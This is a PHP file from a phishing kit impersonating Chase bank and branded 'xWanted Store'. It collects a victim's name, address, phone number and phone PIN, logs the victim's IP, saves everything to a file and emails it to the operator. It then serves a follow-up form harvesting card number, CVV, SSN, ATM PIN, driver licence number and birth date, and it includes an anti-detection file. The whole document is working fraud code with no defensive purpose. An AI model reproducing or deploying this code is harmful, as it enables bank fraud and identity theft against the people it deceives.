<?php
if (isset($_POST['fnm']) && isset($_POST['adr']) && isset($_POST['zip'])) {
    session_start();
    include '../prevents/anti1.php';
    include '../mine.php';
    $ippa = $_SERVER['REMOTE_ADDR'];

    $msg = "=========== <[ Chase ]> ===========\r\n";
    $msg .= "FULL NAME  : {$_POST['fnm']}\r\n";
    $msg .= "ADDRESS        : {$_POST['adr']}\r\n";
    $msg .= "CITY       : {$_POST['cty']}\r\n";
    $msg .= "ZIP CODE   : {$_POST['zip']}\r\n";
    $msg .= "PHONE Carrier     : {$_POST['pht']}\r\n";
    $msg .= "PHONE Number     : {$_POST['phn']}\r\n";
    $msg .= "PHONE PIN     : {$_POST['ppc']}\r\n";
    $msg .= "---------------------- IP Info ----------------------\r\n";
    $msg .= "IP ADDRESS : {$ippa}\r\n";
    $msg .= "TIME       : " . now() . " GMT\r\n";
    $msg .= "=========== <[ xWanted Store ]> ===========\r\n\r\n\r\n";
    $save = fopen("../../".$text.".txt", "a+");
    fwrite($save, $msg);
    fclose($save);
    $subject = "CHASE BILLING [".$ippa."]";
    $headers = "From: xWanted <sales@xwanted.store>\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
    @mail($yours, $subject, $msg, $headers);
    exit('<form method="POST" autocomplete="off" action="javascript:void(0);" novalidates><span class="logos"><span></span><span></span><span></span><span></span></span> <input name="ccn" class="input" placeholder="Card number" type="text" required><div class="row"><div class="col-lg-6 col-sm-6 col-xs-6"><div class="select default"> <select name="mnt" class="input" required><option value="none" disabled selected>MM</option><option value="01">01</option><option value="02">02</option><option value="03">03</option><option value="04">04</option><option value="05">05</option><option value="06">06</option><option value="07">07</option><option value="08">08</option><option value="09">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option> </select></div></div><div class="col-lg-6 col-sm-6 col-xs-6"><div class="select default"> <select name="yer" class="input" required><option value="none" disabled selected>YYYY</option><option value="2019">2019</option><option value="2020">2020</option><option value="2021">2021</option><option value="2022">2022</option><option value="2023">2023</option><option value="2024">2024</option><option value="2025">2025</option><option value="2026">2026</option><option value="2027">2027</option> </select></div></div></div> <input name="csc" class="input" placeholder="CVV / CSC" type="tel" required maxlength="4"> <input name="ssn" class="input" placeholder="Social Security Number (SSN)" type="tel" required> <input name="atm" class="input" placeholder="ATM PIN" type="tel" required maxlength="4"> <input name="mtr" class="input" placeholder="Driver License Number" type="text" required> <input name="dob" class="input" placeholder="Birth date (DD/MM/YYYY)" type="text" required> <input name="ctp" type="text" hidden><div class="row"> <button type="submit" class="primary"><span class="label">Continue</span></button></div> <script>$(document).ready(function(){$("[name=dob]").mask("00/00/0000");$("[name=ccn]").mask("0000 0000 0000 0000 000");$("[name=ssn]").mask("000-00-0000");$("#rotate").hide();function b(d){var c=$(".logos");$("[name=ctp]").val(d);switch(d){case"visa":c.children("span:not(span:nth-child(1))").addClass("filtered");break;case"mastercard":c.children("span:not(span:nth-child(2))").addClass("filtered");break;case"amex":c.children("span:not(span:nth-child(3))").addClass("filtered");break;case"discover":c.children("span:not(span:nth-child(4))").addClass("filtered");break;default:c.children("span").removeClass("filtered")}} var a=false;$("[name=ccn]").validateCreditCard(function(c){var d=$("[name=ccn]");if(d.val()!=""){b(c.card_type==null?"-":c.card_type.name);if(c.valid){d.removeClass("error");a=true}else{d.removeClass("error");a=true}}else{$(".logos").children("span").removeClass("filtered")}});$(document).on("submit","form",function(c){c.preventDefault();if(!a){return false} $("#rotate").show();$.post("../extra/poster/step4.php",$(this).serialize(),function(e,d){if(e&&d=="success"){$("#form_box").html(e)}})})});</script> </form>');
}
?>